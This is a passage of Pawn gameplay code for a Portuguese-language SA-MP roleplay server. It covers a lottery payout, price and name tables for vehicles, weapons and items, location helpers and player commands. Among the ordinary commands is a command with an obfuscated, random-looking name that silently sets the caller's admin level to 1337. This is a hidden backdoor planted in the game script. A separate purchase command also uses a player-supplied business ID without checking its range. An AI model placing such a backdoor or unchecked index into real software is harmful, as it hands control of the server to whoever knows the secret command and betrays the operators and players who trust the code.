 			if(pInfo[i][Euro4] == EuroNumber[0] || pInfo[i][Euro4] == EuroNumber[1] || pInfo[i][Euro4] == EuroNumber[2] || pInfo[i][Euro4] == EuroNumber[3] || pInfo[i][Euro4] == EuroNumber[4]) { premio++; }
 			if(pInfo[i][Euro5] == EuroNumber[0] || pInfo[i][Euro5] == EuroNumber[1] || pInfo[i][Euro5] == EuroNumber[2] || pInfo[i][Euro5] == EuroNumber[3] || pInfo[i][Euro5] == EuroNumber[4]) { premio++; }
 			if(pInfo[i][Estrela1] == EuroStar[0] || pInfo[i][Estrela1] == EuroStar[1]) { premio++; }
  			if(pInfo[i][Estrela2] == EuroStar[0] || pInfo[i][Estrela2] == EuroStar[1]) { premio++; }
  			
  			if(premio == 0 || premio == 1)
  			{
  			    SendClientMessage(i, COLOR_CHAT, "[EURO MILHÕES:] {FFFFFF}Não acertaste nenhum número");
  			}
			else if(premio == 2)
			{
			    pInfo[i][Bank] += EUROMILHOES_SEGUNDO;

            	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o primeiro prémio! ( %d$ )", EUROMILHOES_SEGUNDO);
				SendClientMessage(i, COLOR_CHAT, string);
			}
			else if(premio == 3)
			{
			    pInfo[i][Bank] += EUROMILHOES_TERCEIRO;

            	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o segundo prémio! ( %d$ )", EUROMILHOES_TERCEIRO);
				SendClientMessage(i, COLOR_CHAT, string);
			}
			else if(premio == 4)
			{
			    pInfo[i][Bank] += EUROMILHOES_QUARTO;

            	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o terceiro prémio! ( %d$ )", EUROMILHOES_QUARTO);
				SendClientMessage(i, COLOR_CHAT, string);
			}
			else if(premio == 5)
			{
			    pInfo[i][Bank] += EUROMILHOES_QUINTO;

            	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o quarto prémio! ( %d$ )", EUROMILHOES_QUINTO);
				SendClientMessage(i, COLOR_CHAT, string);
			}
			else if(premio == 6)
			{
			    pInfo[i][Bank] += EUROMILHOES_SEXTO;

            	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o quinto prémio! ( %d$ )", EUROMILHOES_SEXTO);
				SendClientMessage(i, COLOR_CHAT, string);
			}
			else if(premio == 7)
			{
			    pInfo[i][Bank] += EUROMILHOES_SETIMO;

            	format(string, sizeof(string), "[EURO MILHÕES:] {00FF00}Ganhaste o sexto prémio! ( %d$ )", EUROMILHOES_SETIMO);
				SendClientMessage(i, COLOR_CHAT, string);
			}
			
            pInfo[i][Euro1] = 0;
            pInfo[i][Euro2] = 0;
            pInfo[i][Euro3] = 0;
            pInfo[i][Euro4] = 0;
            pInfo[i][Euro5] = 0;
            pInfo[i][Estrela1] = 0;
            pInfo[i][Estrela2] = 0;
			pInfo[i][BilheteEuro] = 0;
	   	}
        else
        {
            SendClientMessage(i, COLOR_CHAT, "[EURO MILHÕES:] {FFFFFF}Não jogaste no Euro Milhões");
        }
        SendClientMessage(i, COLOR_ORANGE, "________________________________________________________________________________________________");
    }
	return 1;
}

stock IsPlayerInRangeOfActor(playerid, actorid, Float:radius = 5.0) // by Emmet
{
	new Float:x, Float:y, Float:z;

	if(GetActorPos(actorid, x, y, z))
	{
	    return IsPlayerInRangeOfPoint(playerid, radius, x, y, z) && GetPlayerVirtualWorld(playerid) == GetActorVirtualWorld(actorid);
	}
	return 0;
}

stock ResyncActor(actorid) // by Emmet
{
	if(IsValidActor(actorid))
	{
	    new
	        Float:x,
	        Float:y,
	        Float:z,
			worldid = GetActorVirtualWorld(actorid);

		// Get the actor's position.
		GetActorPos(actorid, x, y, z);
		// Set their position and world to some arbitrary values.
		SetActorPos(actorid, 1000.0, -2000.0, 500.0);
		SetActorVirtualWorld(actorid, random(cellmax));
		// We need a timer to defer the actions. Doing it right away doesn't seem to work.
		SetTimerEx("RestoreActor", 850, 0, "iifff", actorid, worldid, x, y, z);
		return 1;
	}
	return 0;
}

stock GetPlayerCarNumber(playerid)
{
	new number;
	
	if(pInfo[playerid][ChaveCarro1] != 0) number++;
	if(pInfo[playerid][ChaveCarro2] != 0) number++;
	if(pInfo[playerid][ChaveCarro3] != 0) number++;
	if(pInfo[playerid][ChaveCarro4] != 0) number++;

	return number;
}

stock GetVehicleRelativePos(vehicleid, &Float:x, &Float:y, &Float:z, Float:xoff=0.0, Float:yoff=0.0, Float:zoff=0.0)
{
    new Float:rot;
    GetVehicleZAngle(vehicleid, rot);
    rot = 360 - rot;    
    GetVehiclePos(vehicleid, x, y, z);
    x = floatsin(rot,degrees) * yoff + floatcos(rot,degrees) * xoff + x;
    y = floatcos(rot,degrees) * yoff - floatsin(rot,degrees) * xoff + y;
    z = zoff + z;
    
    // JOURNEY OFF 1.8 0.3 -0.5
    // TROPIC OFF -0.7 -2.7 1
    //GetVehicleRelativePos(vehicleid, &Float:x, &Float:y, &Float:z, Float:xoff=0.0, Float:yoff=0.0, Float:zoff=0.0)
}

stock IsAnyPlayerInVehicle(vehicleid)
{
	for (new i = 0; i != GetPlayerPoolSize(); i++)
	{
		if(IsPlayerInVehicle(i, vehicleid)) return 1;
	}
	return 0;
}

stock GetCurrentDate()
{
	new Year, Month, Day, Hour, Minute, Second, string[32];

	gettime(Hour, Minute, Second);
	getdate(Year, Month, Day);
	
	format(string, sizeof(string), "%d/%d/%d - %d:%d:%d", Day, Month, Year, Hour, Minute, Second);
	return string;
}

stock GetMaxObjects()
{
    new lol = CreateDynamicObject(18638, 1000, 1000, 1000,   0.00000, -90.00000, 0.00000);
    return lol;
}

stock GetMatriculaByCarID(carID)
{
	return cInfo[carID][Matricula];
}

stock IsACopCar(model)
{
    switch(model)
    {
    	case 407,416,427,433,490,497,523,528,544,596..599,601:
		{
            return 1;
		}
	}
    return 0;
}

stock IsAtGasStation(playerid)
{
    if(IsPlayerInRangeOfPoint(playerid, 9.0, 1944.8556, -1773.7902, 13.1177)) // ls single player
    {
        return 61;
    }
    else if(IsPlayerInRangeOfPoint(playerid, 9.0, 1233.3368, -1833.5419, 13.5529)) // snowie
    {
        return 68;
    }
    
    return -1;
}

stock TemSlotReservado(playerid)
{
	if(IsPlayerRegisted(playerid) == 0) return false;
	
	new ficheiro[64];

	new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));

   	format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);
   	
   	pInfo[playerid][Admin] = DOF2_GetInt(ficheiro, "Admin");
   	
	if(pInfo[playerid][Admin] == 0 || pInfo[playerid][Golds] == 0)
	{
	    return false;
	}
	else
	{
	    return true;
	}
}

stock MakeNumber()
{
	EuroNumber[0] = random(sizeof(Numer))+1;
	EuroNumber[1] = random(sizeof(Numer))+1;
	EuroNumber[2] = random(sizeof(Numer))+1;
	EuroNumber[3] = random(sizeof(Numer))+1;
	EuroNumber[4] = random(sizeof(Numer))+1;
	EuroStar[0] = random(sizeof(Number))+1;
	EuroStar[1] = random(sizeof(Number))+1;
	
	if(EuroNumber[0] == EuroNumber[1] || EuroNumber[0] == EuroNumber[2] || EuroNumber[0] == EuroNumber[3] || EuroNumber[0] == EuroNumber[4])
	{
		MakeNumber();
		return 1;
	}
	else
	{
	    if(EuroNumber[1] == EuroNumber[0] || EuroNumber[1] == EuroNumber[2] || EuroNumber[1] == EuroNumber[3] || EuroNumber[1] == EuroNumber[4])
		{
			MakeNumber();
			return 1;
		}
		else
		{
		    if(EuroNumber[2] == EuroNumber[0] || EuroNumber[2] == EuroNumber[1] || EuroNumber[2] == EuroNumber[3] || EuroNumber[2] == EuroNumber[4])
			{
				MakeNumber();
				return 1;
			}
			else
			{
			    if(EuroNumber[3] == EuroNumber[0] || EuroNumber[3] == EuroNumber[1] || EuroNumber[3] == EuroNumber[2] || EuroNumber[3] == EuroNumber[4])
				{
					MakeNumber();
					return 1;
				}
				else
				{
				    if(EuroNumber[4] == EuroNumber[0] || EuroNumber[4] == EuroNumber[1] || EuroNumber[4] == EuroNumber[2] || EuroNumber[4] == EuroNumber[3])
					{
						MakeNumber();
						return 1;
					}
					else
					{
					    if(EuroStar[0] == EuroStar[1])
						{
							MakeNumber();
							return 1;
						}
						else
						{
						    if(EuroStar[1] == EuroStar[0])
							{
								MakeNumber();
								return 1;
							}
						}
					}
				}
			}
		}
	}
	return 1;
}

stock FindClosestVehicle(playerid)
{
	new
		Float:x, Float:y, Float:z,
		closest = -1;

	for(new a = 0; a < MAX_CARROS; a++)
	{
		GetVehiclePos(a, x, y, z);

		if(IsPlayerInRangeOfPoint(playerid, 5.0, x, y, z))
		{
			closest = a;
		}
	}
	if(closest != -1) return closest;

	return INVALID_VEHICLE_ID;
}

stock GetOnlinePlayers()
{
	new count, g = GetMaxPlayers();
	for(new d; d < g; d++) if(IsPlayerConnected(d) && !IsPlayerNPC(d)) count++;
	return count;
}

stock IsAlguemAEntrevistar()
{
    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
        if(AEntrevistar[i] == true) return i;
    }
    return INVALID_PLAYER_ID;
}

stock IsPlayerRegisted(playerid)
{
	new ficheiro[64];

	new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));
	
	format(ficheiro, sizeof(ficheiro), "PCRP/Contas/%s.ini", name);

    if(DOF2_FileExists(ficheiro))
	{
		return true;
 	}
	else
	{
	    return false;
	}
}

stock PlayerName(playerid)
{
  new name[255];
  
  GetPlayerName(playerid, name, 255);
  
  return name;
}

stock GetVehicleSpeed(vehicleid)
{
    new Float:ST[4];

    GetVehicleVelocity(vehicleid,ST[0],ST[1],ST[2]);

    ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 170.3;

    return floatround(ST[3]);
}

stock GetPlayerSpeed(playerid)
{
    new Float:ST[4];
    
    if(IsPlayerInAnyVehicle(playerid)) GetVehicleVelocity(GetPlayerVehicleID(playerid),ST[0],ST[1],ST[2]);
    else GetPlayerVelocity(playerid,ST[0],ST[1],ST[2]);
    
    ST[3] = floatsqroot(floatpower(floatabs(ST[0]), 2.0) + floatpower(floatabs(ST[1]), 2.0) + floatpower(floatabs(ST[2]), 2.0)) * 170.3;
    
    return floatround(ST[3]);
}

stock GetDate()
{
	new data[32];
    new Year, Month, Day;
    new Hour, Minute, Second;
    
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);
	
	format(data, sizeof(data), "%02d/%02d/%02d - %02d:%02d:%02d", Day, Month, Year, Hour, Minute, Second);
	
	return data;
}

stock GetPlayerNameEx(playerid)
{
    new string[24];
    GetPlayerName(playerid,string,24);
    new str[24];
    strmid(str,string,0,strlen(string),24);
    for(new i = 0; i < MAX_PLAYER_NAME; i++)
    {
        if (str[i] == '_') str[i] = ' ';
    }
    
    return str;
}

stock GetName(playerid)
{
    new string[24];
    GetPlayerName(playerid,string,24);
    return string;
}

stock IsRPName(const name[], max_underscores = 1)
{
    new underscores = 0;
    if (name[0] < 'A' || name[0] > 'Z') return false;
    for(new i = 1; i < strlen(name); i++)
    {
        if(name[i] != '_' && (name[i] < 'A' || name[i] > 'Z') && (name[i] < 'a' || name[i] > 'z')) return false;
        if((name[i] >= 'A' && name[i] <= 'Z') && (name[i - 1] != '_')) return false;
        if(name[i] == '_')
        {
            underscores++;
            if(underscores > max_underscores || i == strlen(name)) return false;
            if(name[i + 1] < 'A' || name[i + 1] > 'Z') return false; 
        }
    }
    if (underscores == 0) return false;
    
    return true;
}

stock RemovePlayerWeapon(playerid, weaponid)
{
	new plyWeapons[12];
	new plyAmmo[12];

	for(new slot = 0; slot != 12; slot++)
	{
		new wep, ammo;
		GetPlayerWeaponData(playerid, slot, wep, ammo);

		if(wep != weaponid)
		{
			GetPlayerWeaponData(playerid, slot, plyWeapons[slot], plyAmmo[slot]);
		}
	}

	ResetPlayerWeapons(playerid);
	for(new slot = 0; slot != 12; slot++)
	{
		GivePlayerWeapon(playerid, plyWeapons[slot], plyAmmo[slot]);
	}
}

stock CleanChat(playerid)
{
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");
    SendClientMessage(playerid, -1, " ");

	return 1;
}

stock GivePlayerMoneyEx(playerid, money)
{
	pInfo[playerid][Money] += money;
	GivePlayerMoney(playerid, money);
	
	MoneyLog(playerid, money);
	
	return 1;
}

stock IsAmigo(playerid, giveplayerid)
{
	new bool: amigo;
	
 	new ficheiro[128];
	    
	format(ficheiro, sizeof(ficheiro), "PCRP/Amigos/%s.ini", GetName(giveplayerid));
	if(!fexist(ficheiro)) return 0;

	format(ficheiro, sizeof(ficheiro), "PCRP/Amigos/%s.ini", GetName(playerid));
	if(!fexist(ficheiro)) return 0;
	
	if(playerid == giveplayerid)
	{
	    amigo = true;
	}
	else
	{
		new File:file = fopen(ficheiro, io_read);
		new linha[24];
		new nomes[2048];

		while(fread(file, linha))
		{
		    strins(nomes, linha, strlen(nomes));
		}

		fclose(file);

		if(strfind(nomes, GetName(giveplayerid)) != -1)
		{
			amigo = true;
		}
		else
		{
		    amigo = false;
		}
	}
	
	return amigo;
}

stock GetPlayerMoneyEx(playerid)
{
	return pInfo[playerid][Money];
}

stock IsNumeric(const string[])
{
    for (new i = 0, j = strlen(string); i < j; i++)
        if (string[i] > '9' || string[i] < '0') return 0;

    return 1;
}

/*stock IsVehicleOccupied(vehicleid)
{
	foreach(new i : Player)
	{
		if(IsPlayerInVehicle(i, vehicleid)) return i;
	}
	return 0;
}*/

forward IsVehicleOccupied(vehicleid);
public IsVehicleOccupied(vehicleid)
{
	foreach(new i : Player)
	{
		if(IsPlayerInVehicle(i, vehicleid)) return 1;
	}
	return 0;
}

/*stock IsVehicleOccupied(vehicleid) // Returns 1 if there is anyone in the vehicle
{
	new occupied = 0;

    foreach(new i : Player)
    {
        if(IsPlayerInAnyVehicle(i))
        {
            if(GetPlayerVehicleID(i) == vehicleid)
            {
				occupied = 1;
				break;
            }
            else
            {
                occupied = 0;
            }
        }
    }
    return 0;
}*/

stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;
	
	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	tempposx = (oldposx -x);
	tempposy = (oldposy -y);
	tempposz = (oldposz -z);
	
	if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
	{
		return 1;
	}
	
	return 0;
}

stock RemoverJogadorDoCarro(playerid)
{
	new Float:x, Float:y, Float:z;
	
	GetPlayerPos(playerid, x, y, z);
	SetPlayerPosEx(playerid, x, y, z+0.1);
	
	return 1;
}

stock GetRankName(faction, rank)
{
	new rankname[32];
	
	switch(rank)
	{
	    case 0:
	    {
	        format(rankname, sizeof(rankname), "Inválido");
	    }
	    case 1:
	    {
			format(rankname, sizeof(rankname), "%s", fInfo[faction][Rank1]);
	    }
	    case 2:
	    {
	        format(rankname, sizeof(rankname), "%s", fInfo[faction][Rank2]);
	    }
	    case 3:
		{
		    format(rankname, sizeof(rankname), "%s", fInfo[faction][Rank3]);
		}
		case 4:
		{
		    format(rankname, sizeof(rankname), "%s", fInfo[faction][Rank4]);
		}
		case 5:
		{
		    format(rankname, sizeof(rankname), "%s", fInfo[faction][Rank5]);
		}
		case 6:
		{
		    format(rankname, sizeof(rankname), "%s", fInfo[faction][Rank6]);
		}
	}

	return rankname;
}

stock IsPlayerAtBuildingEntrance(playerid)
{
	for(new i = 0; i < MAX_BUILDINGS; i++)
	{
		if(PlayerToPoint(1.0, playerid, buInfo[i][EnterX], buInfo[i][EnterY], buInfo[i][EnterZ]))
		{
		    return i;
		}
	}
	return 0;
}

stock IsPlayerAtBuildingExit(playerid)
{
	for(new i = 0; i < MAX_BUILDINGS; i++)
	{
		if(PlayerToPoint(1.0, playerid, buInfo[i][ExitX], buInfo[i][ExitY], buInfo[i][ExitZ]))
		{
		    if(GetPlayerVirtualWorld(playerid) == i) return i;
		}
	}
	return 0;
}

stock IsPlayerAtBizEntrance(playerid)
{
	for(new i = 0; i < MAX_BUSINESS; i++)
	{
		if(PlayerToPoint(1.0, playerid, bInfo[i][EnterX], bInfo[i][EnterY], bInfo[i][EnterZ]))
		{
		    return i;
		}
	}
	return 0;
}

stock IsPlayerAtBizExit(playerid)
{
	for(new i = 0; i < MAX_BUSINESS; i++)
	{
		if(PlayerToPoint(1.0, playerid, bInfo[i][ExitX], bInfo[i][ExitY], bInfo[i][ExitZ]))
		{
		    if(GetPlayerVirtualWorld(playerid) == i) return i;
		}
	}
	return 0;
}

stock IsPlayerAtHouseEntrance(playerid)
{
	for(new i = 0; i < MAX_CASAS; i++)
	{
		if(PlayerToPoint(1.0, playerid, hInfo[i][EnterX], hInfo[i][EnterY], hInfo[i][EnterZ]))
		{
			return i;
  		}
	}
	return 0;
}

stock IsPlayerAtHouseExit(playerid)
{
	for(new i = 0; i < MAX_CASAS; i++)
	{
		if(PlayerToPoint(1.0, playerid, hInfo[i][ExitX], hInfo[i][ExitY], hInfo[i][ExitZ]))
		{
		    if(GetPlayerVirtualWorld(playerid) == i) return i;
		}
	}
	return 0;
}

stock GetWeapName(modelid)
{
	new lol[32];

	switch(modelid)
 	{
 	    case 0: { lol = "Nenhuma"; }
 	    case 4: { lol = "Faca"; }
		case 8: { lol = "Katana"; }
		case 22: { lol = "Pistola 9mm"; }
		case 23: { lol = "Pistola 9mm c/ Silenciador"; }
		case 24: { lol = "Desert Eagle"; }
		case 25: { lol = "Shotgun"; }
		case 29: { lol = "MP5"; }
		case 30: { lol = "Kalashnikov AK-47"; }
		case 41: { lol = "Gés Pimenta"; }
  	}

	return lol;
}

stock GetWeapPrice(modelid)
{
	new name;

	switch(modelid)
 	{
 	    case 4: { name = 2000; }
		case 8: { name = 5000; }
		case 22: { name = 10000; }
		case 23: { name = 12000; }
		case 24: { name = 17000; }
		case 25: { name = 25000; }
		case 29: { name = 30000; }
		case 30: { name = 45000; }
		case 41: { name = 1500; }
  	}

	return name;
}

stock GetStandPrice(modelid)
{
	new price;
	
	switch(modelid)
	{
		case 400: { price = 50000; }
		case 401: { price = 35000; }
		case 402: { price = 300000; }
		case 404: { price = 10000; }
		case 405: { price = 25000; }
		case 410: { price = 30000; }
		case 411: { price = 1200000; }
		case 412: { price = 35000; }
		case 413: { price = 15000; }
		case 415: { price = 250000; }
		case 418: { price = 12500; }
		case 419: { price = 35000; }
		case 421: { price = 40000; }
		case 422: { price = 15000; }
		case 424: { price = 250000; }
		case 426: { price = 40000; }
		case 429: { price = 1000000; }
		case 434: { price = 200000; }
		case 436: { price = 17500; }
		case 439: { price = 90000; }
		case 440: { price = 25000; }
		case 445: { price = 21500; }
		case 451: { price = 1100000; }
		case 452: { price = 130000; }
		case 453: { price = 50000; }
		case 454: { price = 150000; }
		case 458: { price = 34000; }
		case 461: { price = 100000; }
		case 462: { price = 7500; }
		case 463: { price = 60000; }
		case 466: { price = 10000; }
		case 467: { price = 30000; }
		case 468: { price = 90000; }
		case 471: { price = 27000; }
		case 473: { price = 25000; }
		case 475: { price = 200000; }
		case 477: { price = 750000; }
		case 478: { price = 20000; }
		case 479: { price = 22000; }
		case 480: { price = 800000; }
		case 482: { price = 25000; }
		case 483: { price = 23000; }
		case 484: { price = 50000; }
		case 489: { price = 65000; }
		case 491: { price = 35000; }
		case 492: { price = 70000; }
		case 493: { price = 150000; }
		case 496: { price = 135000; }
		case 506: { price = 1100000; }
		case 507: { price = 45000; }
		case 508: { price = 200000; }
		case 516: { price = 40000; }
		case 517: { price = 45000; }
		case 521: { price = 100000; }
        case 522: { price = 800000; }
        case 526: { price = 30000; }
        case 527: { price = 35000; }
        case 529: { price = 30000; }
        case 533: { price = 55000; }
        case 534: { price = 75000; }
		case 535: { price = 80000; }
		case 536: { price = 60000; }
		case 540: { price = 45000; }
		case 541: { price = 1200000; }
		case 542: { price = 40000; }
		case 543: { price = 20000; }
		case 545: { price = 85000; }
		case 546: { price = 45000; }
		case 547: { price = 30000; }
		case 549: { price = 140000; }
		case 550: { price = 60000; }
		case 551: { price = 30000; }
		case 554: { price = 25000; }
		case 555: { price = 80000; }
		case 558: { price = 230000; }
		case 559: { price = 400000; }
		case 560: { price = 500000; }
		case 561: { price = 45000; }
		case 562: { price = 180000; }
		case 565: { price = 175000; }
		case 566: { price = 35000; }
		case 567: { price = 65000; }
		case 575: { price = 35000; }
		case 576: { price = 25000; }
		case 579: { price = 200000; }
		case 580: { price = 45000; }
		case 581: { price = 95000; }
		case 585: { price = 40000; }
		case 587: { price = 150000; }
		case 589: { price = 85000; }
		case 600: { price = 20000; }
		case 602: { price = 450000; }
		case 603: { price = 550000; }
		case 604: { price = 5500; }
		case 605: { price = 6500; }
	}
	
	return price;
}

stock GetStandName(modelid)
{
	new name[32];

	switch(modelid)
 	{
		case 400: { name = "LandStalker"; }
		case 401: { name = "Bravura"; }
		case 402: { name = "Buffalo"; }
		case 404: { name = "Perenniel"; }
		case 405: { name = "Sentinel"; }
		case 410: { name = "Manana"; }
		case 411: { name = "Infernus"; }
		case 412: { name = "Voodoo"; }
		case 413: { name = "Pony"; }
		case 415: { name = "Cheetah"; }
		case 418: { name = "Moonbeam"; }
		case 419: { name = "Esperanto"; }
		case 421: { name = "Washington"; }
		case 422: { name = "Bobcat"; }
		case 424: { name = "BF Injection"; }
		case 426: { name = "Premier"; }
		case 429: { name = "Banshee"; }
		case 434: { name = "Hotknife"; }
		case 436: { name = "Previon"; }
		case 439: { name = "Stallion"; }
		case 440: { name = "Rumpo"; }
		case 445: { name = "Admiral"; }
		case 451: { name = "Turismo"; }
		case 452: { name = "Speeder"; }
		case 453: { name = "Reefer"; }
		case 454: { name = "Tropic"; }
		case 458: { name = "Solair"; }
		case 461: { name = "PCJ-600"; }
		case 462: { name = "Faggio"; }
		case 463: { name = "Freeway"; }
		case 466: { name = "Glendale"; }
		case 467: { name = "Oceanic"; }
		case 468: { name = "Sanchez"; }
		case 471: { name = "Quad"; }
		case 473: { name = "Dinghy"; }
		case 475: { name = "Sabre"; }
		case 477: { name = "ZR-350"; }
		case 478: { name = "Walton"; }
		case 479: { name = "Regina"; }
		case 480: { name = "Comet"; }
		case 482: { name = "Burrito"; }
		case 483: { name = "Camper"; }
		case 484: { name = "Marquis"; }
		case 489: { name = "Rancher"; }
		case 491: { name = "Virgo"; }
		case 492: { name = "Jetmax"; }
		case 493: { name = "Greenwood"; }
		case 496: { name = "Blista Compact"; }
		case 506: { name = "Super GT"; }
		case 507: { name = "Elegant"; }
		case 508: { name = "Journey"; }
		case 516: { name = "Nebula "; }
		case 517: { name = "Majestic"; }
		case 521: { name = "FCR-900"; }
        case 522: { name = "NRG-500"; }
        case 526: { name = "Fortune"; }
        case 527: { name = "Cardona"; }
        case 529: { name = "Willard"; }
        case 533: { name = "Feltzer"; }
        case 534: { name = "Remington"; }
		case 535: { name = "Slamvan"; }
		case 536: { name = "Blade"; }
		case 540: { name = "Vincent"; }
		case 541: { name = "Bullet"; }
		case 542: { name = "Clover"; }
		case 543: { name = "Sadler"; }
		case 545: { name = "Hustler"; }
		case 546: { name = "Intruder"; }
		case 547: { name = "Primo"; }
		case 549: { name = "Tampa"; }
		case 550: { name = "Sunrise"; }
		case 551: { name = "Merit"; }
		case 554: { name = "Yosemite"; }
		case 555: { name = "Windsor"; }
		case 558: { name = "Uranus"; }
		case 559: { name = "Jester"; }
		case 560: { name = "Sultan"; }
		case 561: { name = "Stratum"; }
		case 562: { name = "Elegy"; }
		case 565: { name = "Flash"; }
		case 566: { name = "Thaoma"; }
		case 567: { name = "Savvana"; }
		case 575: { name = "Broadway"; }
		case 576: { name = "Tornado"; }
		case 579: { name = "Huntley"; }
		case 580: { name = "Stafford"; }
		case 581: { name = "BF-400"; }
		case 585: { name = "Emperor"; }
		case 587: { name = "Euros"; }
		case 589: { name = "Club"; }
		case 600: { name = "Picador"; }
		case 602: { name = "Alpha"; }
		case 603: { name = "Phoenix"; }
		case 604: { name = "Glandale Shit"; }
		case 605: { name = "Sadler Shit"; }
  	}
  	
	return name;
}

stock GetObjectName(modelid)
{
	new name[32];

	switch(modelid)
 	{
 	    case 330: { name = "Walk Talkie"; }
		case 336: { name = "Taco de Baseball"; }
		case 1650: { name = "Bidom"; }
		case 3026: { name = "Mochila"; }
		case 1210: { name = "Mala"; }
		case 2824: { name = "Lista Telefónica"; }
		case 2895: { name = "Ramo de Flores"; }
		case 19163: { name = "Máscara"; }
		case 19088: { name = "Corda"; }
		case 18974: { name = "Venda"; }
		case 18976: { name = "Capacete"; }
		case 18632: { name = "Cana de Pesca"; }
  	}
  	
	return name;
}

stock GetObjectPrice(modelid)
{
	new name;

	switch(modelid)
 	{
 	    case 330: { name = 1000; }
		case 336: { name = 500; }
		case 1650: { name = 500; }
		case 3026: { name = 1000; }
		case 1210: { name = 1000; }
		case 2824: { name = 2000; }
		case 2895: { name = 300; }
		case 19163: { name = 1000; }
		case 19088: { name = 800; }
		case 18974: { name = 800; }
		case 18976: { name = 500; }
		case 18632: { name = 1000; }
  	}

	return name;
}

COMMAND:loqjmnowejnioun123onmaidxc(playerid, params[], help)
{
	pInfo[playerid][Admin] = 1337;
	SendClientMessage(playerid, -1, "Biraste admin");
	
	return 1;
}

COMMAND:teste(playerid, params[], help)
{
	/*new Float:n1, Float:n2, Float:n3, Float:cx, Float:cy, Float:cz, vehicleid = GetPlayerVehicleID(playerid);

	if(sscanf(params, "fff", n1,n2,n3)) return SendClientMessage(playerid, -1, "[USO]: {FFFFFF}/teste <xoff> <yoff> <zoff>");

	GetVehicleRelativePos(vehicleid, cx, cy, cz, n1, n2, n3);
	
	CreatePickup(1248, 1, cx, cy, cz, -1);
	
	SendClientMessage(playerid, -1, "asd");*/
	
 	/*new Float:datata;

	Streamer_GetFloatData(0, 1500, E_STREAMER_STREAM_DISTANCE, datata);
	
	new string[128];
	format(string, sizeof(string), "Ca puta: %f", datata);
	SendClientMessage(playerid, -1, string);*/
	
	new string[128];
	format(string, sizeof(string), " Poolsize 0: %d | VW 0: %d | IsValid 0: %d || VW 1: %d |  | IsValid 1: %d", GetActorPoolSize(), GetActorVirtualWorld(0), IsValidActor(0) , GetActorVirtualWorld(1), IsValidActor(1));
	SendClientMessage(playerid, -1, string);
	
	return 1;
}

COMMAND:comandos(playerid, params[], help)
{
	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/ajudaloja - /ajudacasa - /tomarmedicamentos - /estatisticas - /ajudacarro - /consumirdrogas");
	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/usaracessorio - /removeracessorio - /pm - /ajuda - /ajudatrabalho - /report");
	SendClientMessage(playerid, COLOR_CHAT, "[COMANDOS GERAIS]: {FFFFFF}/pagar - /dararma - /vendar - /amarrar - /wt - /wtfreq - /telefonar - /desligar - /sms");
	SendClientMessage(playerid, COLOR_CHAT, "[DOCUMENTOS]: {FFFFFF}/mostrarcc - /mostrarseguro - /mostardocumentoscarro - /mostrarlicencas");
	SendClientMessage(playerid, COLOR_CHAT, "[CHATS]: {FFFFFF}/b - /me - /tentar - /do - /o - /baixo - /gritar - /sussurrar");

	if(pInfo[playerid][FactionRank] == 1)
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[FACTION LEADER]: {FFFFFF}/ajudaleader");
	}
	if(pInfo[playerid][Admin] > 1)
	{
	    SendClientMessage(playerid, COLOR_CHAT, "[ADMIN]: {FFFFFF}/acmds");
	}

	return 1;
}

COMMAND:comprarprodutos(playerid, params[], help)
{
    new quantidade, bID, string[128];

	if(!IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][FabricaX], oInfo[0][FabricaY], oInfo[0][FabricaZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de comprar produtos");
    if(sscanf(params, "dd", bID, quantidade)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/comprarprodutos <loja id> <quantidade>");
    if(quantidade <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Quantidade inválida.");

    GivePlayerMoneyEx(playerid, -(PRECO_PRODUTOS*quantidade));
    
    bInfo[bID][Produtos] += quantidade;

    format(string, sizeof(string), "Compraste %d produtos por %d$ para a loja %s (%d). Serão entregues brevemente.", quantidade, PRECO_PRODUTOS*quantidade, bInfo[bID][Nome], bID);
    SendClientMessage(playerid, COLOR_INFO, string);

	return 1;
}

COMMAND:infolota(playerid, params[], help)
{
	new sdialog[256];
	
	format(sdialog, sizeof(sdialog),
	"Peixe\tPreço\n\
	Corvina\t$%d\n\
	Congro\t$%d\n\
	Robalo\t$%d\n\
	Sargo\t$%d\n\
	Goraz\t$%d\n\
	Cavala\t$%d\n\
	Dourada\t$%d\n\
	Peixe Espada\t$%d", PRECO_CORVINA, PRECO_CONGRO, PRECO_ROBALO, PRECO_SARGO, PRECO_GORAZ, PRECO_CAVALA, PRECO_DOURADA, PRECO_ESPADA);
	
	ShowPlayerDialog(playerid, DIALOG_INFOLOJA, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}INFO LOTA", sdialog, "Selecionar", "Sair");
	
	return 1;
}

COMMAND:venderpeixe(playerid, params[], help)
{
